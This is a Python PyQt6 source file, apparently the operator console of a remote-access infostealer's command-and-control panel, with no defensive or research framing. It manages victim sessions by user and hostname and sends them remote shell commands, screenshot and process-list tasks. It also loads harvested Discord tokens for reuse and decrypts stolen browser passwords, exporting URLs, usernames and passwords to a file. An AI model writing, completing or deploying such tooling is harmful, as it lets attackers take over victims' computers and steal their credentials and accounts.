# ui/session_view.py (Full Code - Reworked for New Data Flow)
import uuid
from datetime import datetime
import base64
import json
from PyQt6.QtWidgets import (QWidget, QVBoxLayout, QHBoxLayout, QPushButton, QLabel, 
                             QTabWidget, QDialog, QScrollArea, QMessageBox, QFileDialog)
from PyQt6.QtCore import pyqtSignal, Qt
from PyQt6.QtGui import QPixmap
from ui.discord_pane import DiscordPane
from ui.terminal_pane import TerminalPane
from ui.live_actions_pane import LiveActionsPane
from ui.events_pane import EventsPane
from ui.data_harvest_pane import DataHarvestPane
from ui.decryption_util import Decryptor

class ScreenshotDialog(QDialog):
    def __init__(self, pixmap, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Screenshot Viewer")
        layout = QVBoxLayout(self); self.image_label = QLabel()
        self.image_label.setPixmap(pixmap); scroll_area = QScrollArea()
        scroll_area.setWidget(self.image_label); scroll_area.setWidgetResizable(True)
        layout.addWidget(scroll_area); self.resize(800, 600)

class SessionView(QWidget):
    back_requested = pyqtSignal()
    task_requested = pyqtSignal(str, dict)

    def __init__(self, db_manager):
        super().__init__()
        self.db = db_manager
        self.current_session_id = None
        self.current_session_data = None
        self.response_map = {}
        
        main_layout = QVBoxLayout(self)
        main_layout.setContentsMargins(10, 10, 10, 10); main_layout.setSpacing(10)

        header_widget = QWidget(); header_layout = QHBoxLayout(header_widget)
        header_layout.setContentsMargins(0, 0, 0, 0)
        
        self.back_button = QPushButton("< Back"); self.back_button.setFixedWidth(100)
        self.back_button.clicked.connect(self.back_requested.emit)
        self.session_info_label = QLabel("Managing Session: None"); self.session_info_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.status_label = QLabel("UNKNOWN"); self.status_label.setObjectName("HeaderStatusLabel")
        self.status_label.setAlignment(Qt.AlignmentFlag.AlignCenter); self.status_label.setFixedWidth(120)

        header_layout.addWidget(self.back_button); header_layout.addWidget(self.session_info_label, 1); header_layout.addWidget(self.status_label)
        main_layout.addWidget(header_widget)

        self.tabs = QTabWidget(); main_layout.addWidget(self.tabs)

        self.data_harvest_pane = DataHarvestPane()
        self.liveactions_pane = LiveActionsPane()
        self.terminal_pane = TerminalPane()
        self.events_pane = EventsPane()
        self.discord_pane = DiscordPane()

        self.tabs.addTab(self.data_harvest_pane, "Data Harvest")
        self.tabs.addTab(self.liveactions_pane, "Live Actions")
        self.tabs.addTab(self.terminal_pane, "Live Terminal")
        self.tabs.addTab(self.events_pane, "Events")
        self.tabs.addTab(self.discord_pane, "Discord")
        
        self.liveactions_pane.screenshot_requested.connect(self.send_screenshot_task)
        self.liveactions_pane.pslist_requested.connect(self.send_pslist_task)
        self.terminal_pane.command_entered.connect(self.send_terminal_command)
        self.data_harvest_pane.decryption_requested.connect(self.handle_decryption)
    
    def load_session(self, session_id, session_data):
        self.current_session_id = session_id
        self.current_session_data = session_data
        metadata = session_data.get('metadata', {}); status = session_data.get('status', 'Offline')

        self.terminal_pane.clear_output()
        self.liveactions_pane.clear_results()
        self.events_pane.clear_events()
        self.data_harvest_pane.clear_all_views()
        
        # Load all existing vault data for this session
        for module_name, data_packet in session_data.items():
            if module_name not in ["metadata", "status"]:
                self.data_harvest_pane.update_view(module_name, data_packet.get("output", {}))
        
        # --- DEFINITIVE FIX FOR SMOOTH OPERATION ---
        # Automatically load the harvested Discord token into the Discord pane.
        discord_module = session_data.get("Discord Tokens", {})
        if discord_module:
            token_data = discord_module.get("output", {}).get("data")
            if token_data and isinstance(token_data, list):
                # Pass the first found token to the Discord pane
                self.discord_pane.load_token_from_c2(token_data[0])

        user = metadata.get('user', 'N/A'); hostname = metadata.get('hostname', 'N/A')
        self.session_info_label.setText(f"<b>{user}@{hostname}</b> ({session_id})")
        
        self.status_label.setText(status.upper())
        self.status_label.setProperty("status", status.lower())
        self.status_label.style().unpolish(self.status_label); self.status_label.style().polish(self.status_label)
        
        self.tabs.setCurrentIndex(0)

    def send_terminal_command(self, command):
        self._send_task({"action": "shell", "params": {"command": command}})

    def send_screenshot_task(self):
        self._send_task({"action": "screenshot", "params": {}})

    def send_pslist_task(self):
        self._send_task({"action": "running_processes", "params": {}})

    def _send_task(self, task_data):
        if self.current_session_id:
            response_id = str(uuid.uuid4()); task_data["response_id"] = response_id
            self.response_map[response_id] = task_data
            self.task_requested.emit(self.current_session_id, task_data)

    def handle_command_response(self, session_id, module_name, data_packet):
        if session_id != self.current_session_id: return

        # Update the master data store first, so decryption has access to new files
        self.current_session_data[module_name] = data_packet
        
        response_id = data_packet.get('response_id')
        original_task = self.response_map.pop(response_id, None)
        
        output = data_packet.get('output', {})
        data = output.get('data', '[No data received]')
        status = output.get('status')
        
        if status == 'error':
            action_name = original_task.get('action') if original_task else module_name
            error_message = f"[{datetime.now():%H:%M:%S}] [ERROR] Action '{action_name}' failed: {data}"
            self.events_pane.add_event(error_message)
            self.terminal_pane.append_output(f"{error_message}\n")
            return
        
        # This was a direct command-response from a button click or terminal entry
        if original_task:
            action = original_task.get('action', 'unknown')
            if action == "shell":
                self.terminal_pane.append_output(f"{data}\n")
            elif action == "running_processes":
                self.liveactions_pane.display_result(f"--- Process List @ {datetime.now():%Y-%m-%d %H:%M:%S} ---\n{data}\n")
            elif action == "screenshot":
                try:
                    img_data = base64.b64decode(data); pixmap = QPixmap(); pixmap.loadFromData(img_data)
                    if not pixmap.isNull():
                        dialog = ScreenshotDialog(pixmap, self); dialog.exec()
                    else:
                        raise ValueError("Decoded data is not a valid image.")
                except Exception as e:
                    self.events_pane.add_event(f"[{datetime.now():%H:%M:%S}] [ERROR] Could not display screenshot: {e}")
        # This was a background data harvest packet
        else:
            self.data_harvest_pane.update_view(module_name, output)

    def handle_decryption(self):
        if not self.current_session_data:
            QMessageBox.warning(self, "No Data", "Session data has not been loaded.")
            return

        # Check if browser files have actually been harvested
        if "Browser Files" not in self.current_session_data:
            QMessageBox.warning(self, "Missing Data", "The 'Browser Files' module has not been run for this session yet. Cannot decrypt.")
            return

        decryptor = Decryptor(self.current_session_data)
        results = decryptor.decrypt_passwords()

        if isinstance(results, dict) and "error" in results:
            QMessageBox.critical(self, "Decryption Failed", results["error"])
            return

        if not results:
            QMessageBox.information(self, "No Passwords", "No decryptable passwords were found in the provided data.")
            return

        save_path, _ = QFileDialog.getSaveFileName(self, "Save Decrypted Passwords", f"{self.current_session_id}_passwords.json", "JSON Files (*.json);;Text Files (*.txt)")
        if save_path:
            try:
                with open(save_path, 'w', encoding='utf-8') as f:
                    if save_path.endswith(".json"): json.dump(results, f, indent=4)
                    else:
                        for item in results: f.write(f"Browser: {item[0]}\nURL: {item[1]}\nUsername: {item[2]}\nPassword: {item[3]}\n\n")
                QMessageBox.information(self, "Success", f"Decrypted data saved to:\n{save_path}")
            except Exception as e:
                QMessageBox.critical(self, "Error Saving File", str(e))